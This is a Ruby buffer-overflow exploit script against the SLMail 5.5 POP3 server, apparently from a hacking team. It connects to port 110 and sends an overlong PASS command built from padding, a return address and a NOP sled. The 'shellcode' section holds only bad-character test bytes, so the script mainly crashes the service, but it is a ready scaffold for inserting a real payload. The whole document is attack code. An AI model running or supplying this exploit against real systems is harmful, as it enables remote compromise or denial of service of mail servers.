# Team: MushCr3w
# Code: d0gg.bs3x
# CÓPIA NÃO COMÉDIA

# Target: SLMail 5.5

require 'socket' # Import lib

############## Shell Code ##############
buf = ""
buf += "\x00"
buf += "\x00\x0a"
buf += "\x00\x0a\x0d"
buf += "\x00\x0a\x0d\x20"
############## Shell Code ##############

begin
	buffer = "A" * 2606 + "\x8f\x35\x4a\x5f" + "\x90" * 30 + buf # Overflow // Payload

	print "Input target: "
	t = gets.chomp # Get Target

	c = TCPSocket.open(t,110) # Connection
	r = c.read() # Response
	puts r # Print Response

	c.print("USER usr\n") # Send User
	r = c.read() # Response
	puts r # Print Response

	c.print("PASS #{buffer}\n") # Send Payload
	r = c.read() # Response
	puts r # Print Response 

	c.print("QUIT\n") # Quit of Aplication

rescue
	puts "\nErro ao se conectar a aplicacao\n"
end
